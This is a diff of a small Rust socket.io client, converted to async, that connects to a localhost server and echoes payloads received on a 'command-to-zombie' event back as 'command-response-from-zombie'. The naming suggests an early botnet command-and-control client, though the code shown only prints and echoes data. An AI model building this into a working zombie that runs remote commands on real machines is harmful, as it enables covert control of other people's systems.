@@ -1,35 +1,43 @@
+mod constants;
+
 use std::time::Duration;
 
-use rust_socketio::{ClientBuilder, Event, Payload};
-use serde_json::json;
-
-mod constants;
 use constants::localhost::{LOCALHOST_ADDRESS, LOCALHOST_PORT};
+use futures_util::FutureExt;
+use rust_socketio::{
+    asynchronous::{Client, ClientBuilder},
+    Payload,
+};
 
-fn main() {
-    let url = format!("http://{}:{}", LOCALHOST_ADDRESS, LOCALHOST_PORT);
+#[tokio::main]
+async fn main() {
+    let url: String = format!("http://{}:{}", LOCALHOST_ADDRESS, LOCALHOST_PORT);
 
-    let socket = ClientBuilder::new(url)
+    ClientBuilder::new(url)
         .namespace("/")
-        .on("auth", |payload, _| {
-            println!("Received auth event: {:?}", payload);
+        .on("auth", |payload: Payload, _: Client| {
+            async move {
+                println!("Auth event received: {:?}", payload);
+            }
+            .boxed()
         })
-        .on("command-back", |payload, _| {
-            println!("Received command-back event: {:?}", payload);
+        .on("command-to-zombie", |payload, socket: Client| {
+            async move {
+                println!("Command back received: {:?}", payload);
+
+                if let Err(e) = socket.emit("command-response-from-zombie", payload).await {
+                    println!("Error sending command response: {:?}", e);
+                }
+            }
+            .boxed()
         })
         .connect()
+        .await
         .expect("Connection failed");
 
-    let command_data = json!({
-        "action": "example_command",
-        "data": "some data"
-    });
-
-    socket
-        .emit("command", command_data)
-        .expect("Failed to emit command");
+    println!("Connected to server");
 
     loop {
-        std::thread::sleep(Duration::from_secs(1));
+        tokio::time::sleep(Duration::from_secs(1)).await;
     }
 }
